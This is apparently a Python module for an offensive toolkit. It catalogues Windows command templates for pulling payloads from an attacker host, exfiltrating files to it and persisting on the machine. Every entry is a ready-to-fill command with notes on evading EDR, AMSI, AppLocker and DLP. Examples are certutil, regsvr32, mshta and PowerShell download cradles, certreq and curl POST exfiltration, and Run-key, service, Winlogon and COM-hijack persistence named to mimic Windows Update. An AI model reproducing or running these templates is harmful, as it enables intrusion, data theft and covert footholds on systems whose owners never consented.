
from commands import TechniqueEntry

WINDOWS_COMMANDS = {

    "download": [
        TechniqueEntry(
            name="certutil (URL cache download)",
            binary="certutil",
            template='certutil -urlcache -split -f http://{ip}:{port}/{filename} %TEMP%\\{filename}',
            stealth_note=(
                "certutil is a signed Microsoft binary used for certificate operations (LOLBin). "
                "Its HTTP requests blend with legitimate CA certificate retrieval. "
                "The -urlcache flag abuses the URL cache mechanism which is rarely monitored."
            ),
            requires="Attacker must host file via HTTP (e.g. python3 -m http.server {port})",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="bitsadmin (Background Transfer)",
            binary="bitsadmin",
            template='bitsadmin /transfer job1 /download /priority normal http://{ip}:{port}/{filename} %TEMP%\\{filename}',
            stealth_note=(
                "BITS is the legitimate Windows Update download service. "
                "Traffic is indistinguishable from routine OS update activity. "
                "BITS jobs persist across reboots and can be set to run at low priority."
            ),
            requires="HTTP server on attacker side.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="PowerShell WebClient (hidden)",
            binary="powershell",
            template=(
                "powershell -nop -w hidden -c \"(New-Object Net.WebClient).DownloadFile("
                "'http://{ip}:{port}/{filename}','$env:TEMP\\{filename}')\""
            ),
            stealth_note=(
                "Inline PowerShell with -nop (no profile) and -w hidden (no window). "
                "Net.WebClient is commonly used by legitimate admin scripts. "
                "No .ps1 script written to disk — fully in-memory execution."
            ),
            requires="PowerShell execution policy may restrict this. Use -ep bypass if needed.",
            privilege="user",
            detection_risk="high",
        ),
        TechniqueEntry(
            name="curl (Windows 10+ native)",
            binary="curl",
            template='curl -s -o %TEMP%\\{filename} http://{ip}:{port}/{filename}',
            stealth_note=(
                "Native curl.exe ships with Windows 10/11 (build 1803+). "
                "The -s flag suppresses progress output. "
                "Security tools may not flag built-in curl traffic as it's a signed OS component."
            ),
            requires="Windows 10 build 1803+ (curl shipped natively).",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="xcopy (SMB download)",
            binary="xcopy",
            template='xcopy \\\\{ip}\\share\\{filename} %TEMP%\\ /Y /Q /H',
            stealth_note=(
                "SMB file copy mimics legitimate domain file-share traffic. "
                "/Q suppresses copy output, /H includes hidden files. "
                "In Active Directory environments, SMB traffic is ubiquitous and expected."
            ),
            requires="Attacker must run an SMB server (e.g. impacket-smbserver share . -smb2support).",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="regsvr32 (Squiblydoo COM download)",
            binary="regsvr32",
            template='regsvr32 /s /n /u /i:http://{ip}:{port}/{filename} scrobj.dll',
            stealth_note=(
                "regsvr32 is a signed Microsoft binary that can load COM scriptlets "
                "from remote URLs — the classic 'Squiblydoo' technique. "
                "This bypasses AppLocker default rules and application whitelisting "
                "since regsvr32.exe is a trusted system binary."
            ),
            requires="Remote file must be a valid SCT (COM scriptlet) XML.",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="msiexec (remote MSI install)",
            binary="msiexec",
            template='msiexec /q /i http://{ip}:{port}/{filename}',
            stealth_note=(
                "msiexec.exe is the Windows Installer service — a signed, trusted Microsoft binary. "
                "/q flag runs in quiet mode (no UI). Remote MSI installation is a legitimate feature "
                "used by enterprise software deployment systems like SCCM and Intune."
            ),
            requires="Remote file must be a valid .msi package (can contain custom actions for code execution).",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="rundll32 (URLmon download)",
            binary="rundll32",
            template='rundll32.exe urlmon.dll,URLDownloadToFileA 0 http://{ip}:{port}/{filename} %TEMP%\\{filename} 0 0',
            stealth_note=(
                "rundll32.exe is a core Windows binary that loads and runs DLL functions. "
                "URLDownloadToFileA is a legitimate urlmon.dll export used by Internet Explorer. "
                "EDR tools may not flag this as the download happens inside a trusted DLL call."
            ),
            requires="HTTP server hosting the file.",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="esentutl (Jet DB file copy)",
            binary="esentutl",
            template='esentutl.exe /y \\\\{ip}\\share\\{filename} /d %TEMP%\\{filename} /o',
            stealth_note=(
                "esentutl.exe is the Extensible Storage Engine utility — a signed Microsoft binary "
                "used for Jet database operations. The /y flag copies files, and /o suppresses the logo. "
                "This binary is almost never monitored by EDR/SIEM rules."
            ),
            requires="Attacker must run an SMB server (e.g. impacket-smbserver).",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="hh.exe (HTML Help download)",
            binary="hh",
            template='hh.exe http://{ip}:{port}/{filename}',
            stealth_note=(
                "hh.exe is the Microsoft HTML Help executable — a signed LOLBin. "
                "It can fetch and render remote CHM files containing embedded scripts. "
                "Rarely monitored as it's considered a benign help viewer."
            ),
            requires="Remote file should be a .chm HTML Help file (can contain VBScript/JScript for execution).",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="cmstp (INF profile install)",
            binary="cmstp",
            template='cmstp.exe /s /ns http://{ip}:{port}/{filename}',
            stealth_note=(
                "cmstp.exe is the Microsoft Connection Manager Profile Installer. "
                "It accepts INF files that can contain RunPreSetupCommands for code execution. "
                "Bypasses AppLocker and WDAC default policies. "
                "/s (silent) and /ns (no-shortcut) flags prevent any visible UI."
            ),
            requires="Remote file must be a crafted .inf file with RunPreSetupCommands section.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="expand (remote CAB extract)",
            binary="expand",
            template='expand \\\\{ip}\\share\\{filename} %TEMP%\\{filename}',
            stealth_note=(
                "expand.exe is a signed Microsoft binary for extracting CAB (cabinet) archives. "
                "It supports UNC paths, allowing remote file retrieval via SMB. "
                "Extremely obscure LOLBin — almost zero EDR/SIEM coverage."
            ),
            requires="Attacker must run an SMB server.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="PowerShell Invoke-RestMethod",
            binary="powershell",
            template=(
                "powershell -nop -w hidden -c \"Invoke-RestMethod "
                "-Uri http://{ip}:{port}/{filename} "
                "-OutFile $env:TEMP\\{filename}\""
            ),
            stealth_note=(
                "Invoke-RestMethod is designed for REST API consumption and is "
                "less commonly flagged by AMSI/Sigma rules compared to Invoke-WebRequest "
                "or Net.WebClient. The -nop -w hidden flags suppress profile loading and window."
            ),
            requires="HTTP server hosting the file.",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="Start-BitsTransfer (PS cmdlet)",
            binary="powershell",
            template=(
                "powershell -nop -w hidden -c \"Start-BitsTransfer "
                "-Source http://{ip}:{port}/{filename} "
                "-Destination $env:TEMP\\{filename}\""
            ),
            stealth_note=(
                "Start-BitsTransfer is the PowerShell wrapper for BITS. "
                "BITS traffic uses the same channel as Windows Update downloads, "
                "making it blend perfectly with legitimate OS activity. "
                "BITS transfers survive reboots and network interruptions."
            ),
            requires="HTTP server hosting the file.",
            privilege="user",
            detection_risk="low",
        ),
    ],

    "upload": [
        TechniqueEntry(
            name="PowerShell HTTP POST exfil",
            binary="powershell",
            template=(
                "powershell -nop -w hidden -c \"Invoke-WebRequest -Uri http://{ip}:{port}/upload "
                "-Method POST -InFile '$env:TEMP\\{filename}'\""
            ),
            stealth_note=(
                "Outbound HTTP POST with hidden window and no profile. "
                "Using Invoke-WebRequest keeps the payload in memory. "
                "POST traffic to a custom port blends with web app activity."
            ),
            requires="Attacker must run an HTTP server accepting POST (e.g. uploadserver pip pkg).",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="certutil Base64 + HTTP PUT",
            binary="certutil",
            template=(
                'certutil -encode %TEMP%\\{filename} %TEMP%\\{filename}.b64 2>nul '
                '&& curl -s -X PUT http://{ip}:{port}/{filename}.b64 '
                '--data-binary @%TEMP%\\{filename}.b64 '
                '&& del %TEMP%\\{filename}.b64'
            ),
            stealth_note=(
                "Data is Base64-encoded before transmission, bypassing naive "
                "content-inspection rules. certutil encode is rarely alerted on. "
                "Error output is suppressed with 2>nul and temp file is auto-deleted."
            ),
            requires="curl must be available (Win10+). Server must accept PUT.",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="BITS (upload via HTTP PUT)",
            binary="bitsadmin",
            template='bitsadmin /transfer exfiljob /upload http://{ip}:{port}/{filename} %TEMP%\\{filename}',
            stealth_note=(
                "BITS upload uses the same Windows Update service channel, "
                "making exfil traffic blend with routine OS activity. "
                "BITS jobs are managed by svchost.exe, not by suspicious user processes."
            ),
            requires="HTTP server must support PUT/upload endpoint.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="ftp (anonymous exfil)",
            binary="ftp",
            template=(
                'echo open {ip} {port}>ftpcmd.txt & echo anonymous>>ftpcmd.txt '
                '& echo pass>>ftpcmd.txt & echo put %TEMP%\\{filename}>>ftpcmd.txt '
                '& echo bye>>ftpcmd.txt & ftp -s:ftpcmd.txt & del ftpcmd.txt'
            ),
            stealth_note=(
                "Built-in ftp.exe used for anonymous upload. "
                "FTP is often overlooked in firewall egress rules. "
                "Script file is auto-deleted after transfer. "
                "NOTE: If using non-standard port, ensure FTP server listens on {port}."
            ),
            requires="Attacker-side FTP server with anonymous write access (e.g. pyftpdlib).",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="xcopy (SMB exfil)",
            binary="xcopy",
            template='xcopy %TEMP%\\{filename} \\\\{ip}\\share\\ /Y /Q',
            stealth_note=(
                "SMB traffic mimics domain file-share usage, blending with "
                "legitimate corporate file transfers. /Q suppresses file copy output. "
                "In AD environments, outbound SMB is often permitted."
            ),
            requires="Attacker must run an SMB server (e.g. impacket-smbserver share . -smb2support).",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="certreq (HTTP POST exfil)",
            binary="certreq",
            template='certreq -Post -config http://{ip}:{port}/upload %TEMP%\\{filename} %TEMP%\\response.txt',
            stealth_note=(
                "certreq.exe is a signed Microsoft binary for certificate enrollment. "
                "The -Post flag sends file content via HTTP POST to a specified URL. "
                "This is an extremely obscure exfiltration vector — almost zero EDR/SIEM "
                "coverage. Traffic appears as certificate enrollment activity."
            ),
            requires="HTTP server accepting POST data.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="curl HTTP POST (native Win10+)",
            binary="curl",
            template='curl -s -X POST http://{ip}:{port}/upload -F "file=@%TEMP%\\{filename}"',
            stealth_note=(
                "Native curl.exe ships with Windows 10+. "
                "The -s flag suppresses progress output. "
                "Multipart file upload mimics standard web form submission traffic."
            ),
            requires="Windows 10+ (native curl). HTTP server accepting multipart upload.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="PowerShell Invoke-RestMethod POST",
            binary="powershell",
            template=(
                "powershell -nop -w hidden -c \"Invoke-RestMethod "
                "-Uri http://{ip}:{port}/upload -Method POST "
                "-InFile $env:TEMP\\{filename}\""
            ),
            stealth_note=(
                "Invoke-RestMethod is less commonly targeted by AMSI and Sigma rules "
                "than Invoke-WebRequest or Net.WebClient. Hidden window and no-profile "
                "flags minimize forensic artifacts."
            ),
            requires="HTTP server accepting POST data.",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="makecab (compressed exfil)",
            binary="makecab",
            template=(
                'makecab %TEMP%\\{filename} %TEMP%\\{filename}.cab '
                '&& curl -s -X POST http://{ip}:{port}/upload '
                '--data-binary @%TEMP%\\{filename}.cab '
                '&& del %TEMP%\\{filename}.cab'
            ),
            stealth_note=(
                "makecab.exe is a signed Microsoft binary that creates CAB archives. "
                "Compressing data before exfil reduces size and changes file signatures, "
                "bypassing content-inspection DLP rules. "
                "CAB format is not commonly inspected by network IDS."
            ),
            requires="curl must be available (Win10+). HTTP server accepting POST.",
            privilege="user",
            detection_risk="low",
        ),
    ],

    "persistence": [
        TechniqueEntry(
            name="reg add (Run key)",
            binary="reg",
            template=(
                'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                '/v Updater /t REG_SZ /d '
                '"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('
                "'http://{ip}:{port}/{filename}')\" /f"
            ),
            stealth_note=(
                "HKCU Run key does not require admin rights. "
                "Value name 'Updater' mimics legitimate Windows Update entries. "
                "PowerShell runs hidden with no profile, downloading and executing in-memory."
            ),
            requires="Attacker must serve the payload script at the specified URL.",
            privilege="user",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="schtasks (Scheduled Task)",
            binary="schtasks",
            template=(
                'schtasks /create /tn "WindowsUpdate" /tr '
                '"powershell -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient)'
                ".DownloadString('http://{ip}:{port}/{filename}')\" "
                '/sc onlogon /rl highest /f'
            ),
            stealth_note=(
                "Task named 'WindowsUpdate' blends with legitimate scheduled tasks. "
                "/rl highest uses highest available privilege level. "
                "/sc onlogon ensures execution on every user login."
            ),
            requires="Admin rights for /rl highest. User-level works with /rl limited.",
            privilege="admin",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="wmic (process create)",
            binary="wmic",
            template=(
                'wmic process call create "powershell -nop -w hidden -ep bypass '
                "-c IEX(New-Object Net.WebClient).DownloadString("
                "'http://{ip}:{port}/{filename}')\""
            ),
            stealth_note=(
                "wmic is a signed Windows management binary rarely blocked. "
                "NOTE: wmic.exe is deprecated since Windows 11 22H2 but still functions. "
                "Process creation via WMI makes parent process WmiPrvSE.exe — "
                "breaking suspicious parent-child process chain analysis."
            ),
            requires="Admin rights may be required on newer Windows versions.",
            privilege="admin",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="mshta (HTA persistence via Run key)",
            binary="mshta",
            template=(
                'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                '/v MSUpdate /t REG_SZ /d '
                '"mshta http://{ip}:{port}/{filename}" /f'
            ),
            stealth_note=(
                "mshta.exe is a signed Microsoft HTML Application host. "
                "It can fetch and execute remote HTA files containing VBScript/JScript. "
                "Bypasses AppLocker default rules and script-block logging. "
                "Run key named 'MSUpdate' mimics legitimate Microsoft Update."
            ),
            requires="Remote file must be a valid .hta HTML Application.",
            privilege="user",
            detection_risk="high",
        ),
        TechniqueEntry(
            name="netsh (helper DLL persistence)",
            binary="netsh",
            template='netsh add helper %TEMP%\\{filename}',
            stealth_note=(
                "netsh.exe loads helper DLLs from registry on every invocation. "
                "Once registered, the DLL executes whenever any user or service runs netsh. "
                "The DLL path persists in HKLM\\SOFTWARE\\Microsoft\\NetSh. "
                "Network configuration tools frequently invoke netsh, providing regular callbacks."
            ),
            requires="Admin rights. {filename} must be a compiled DLL dropped to TEMP first.",
            privilege="admin",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="sc.exe (service persistence)",
            binary="sc",
            template=(
                'sc create WindowsUpdateSvc binPath= '
                '"cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('
                "'http://{ip}:{port}/{filename}')\" "
                'start= auto'
            ),
            stealth_note=(
                "sc.exe is the Windows Service Controller — a signed system binary. "
                "Service named 'WindowsUpdateSvc' mimics legitimate Windows services. "
                "start=auto ensures the service starts on every boot. "
                "Services run as SYSTEM by default, providing highest privilege."
            ),
            requires="Admin/SYSTEM rights required for service creation.",
            privilege="admin",
            detection_risk="medium",
        ),
        TechniqueEntry(
            name="Winlogon Shell (registry)",
            binary="reg",
            template=(
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" '
                '/v Userinit /t REG_SZ /d '
                '"C:\\Windows\\system32\\userinit.exe,powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('
                "'http://{ip}:{port}/{filename}')\" /f"
            ),
            stealth_note=(
                "Winlogon Userinit key executes during user logon, before the shell loads. "
                "Appending to the existing userinit.exe value ensures normal logon continues. "
                "This is a deep system-level persistence mechanism that survives safe mode boots."
            ),
            requires="SYSTEM or admin rights required for HKLM registry modification.",
            privilege="system",
            detection_risk="high",
        ),
        TechniqueEntry(
            name="Startup folder (.lnk shortcut)",
            binary="powershell",
            template=(
                "powershell -nop -w hidden -c \"$s=(New-Object -COM WScript.Shell).CreateShortcut("
                "'$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.lnk');"
                "$s.TargetPath='powershell';"
                "$s.Arguments='-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString("
                "''http://{ip}:{port}/{filename}'')';"
                "$s.WindowStyle=7;$s.Save()\""
            ),
            stealth_note=(
                "The Startup folder is a legitimate Windows autorun location. "
                "A .lnk shortcut named 'Update' appears benign in file listings. "
                "No registry modification required — HKCU-level persistence without admin. "
                "WindowStyle=7 makes the window minimized."
            ),
            requires="PowerShell access. Attacker serves payload script at URL.",
            privilege="user",
            detection_risk="low",
        ),
        TechniqueEntry(
            name="COM Object Hijack (InprocServer32)",
            binary="reg",
            template=(
                'reg add "HKCU\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32" '
                '/ve /t REG_SZ /d "%TEMP%\\{filename}" /f && '
                'reg add "HKCU\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32" '
                '/v ThreadingModel /t REG_SZ /d "Both" /f'
            ),
            stealth_note=(
                "COM object hijacking abuses Windows COM class loading order. "
                "HKCU entries take priority over HKLM, allowing user-level hijacking "
                "without admin rights. The hijacked CLSID is loaded by explorer.exe "
                "on every login, executing the attacker DLL. No process creation — "
                "code runs inside explorer.exe address space."
            ),
            requires="DLL must be dropped to TEMP first. Attacker serves at http://{ip}:{port}/{filename}.",
            privilege="user",
            detection_risk="low",
        ),
    ],
}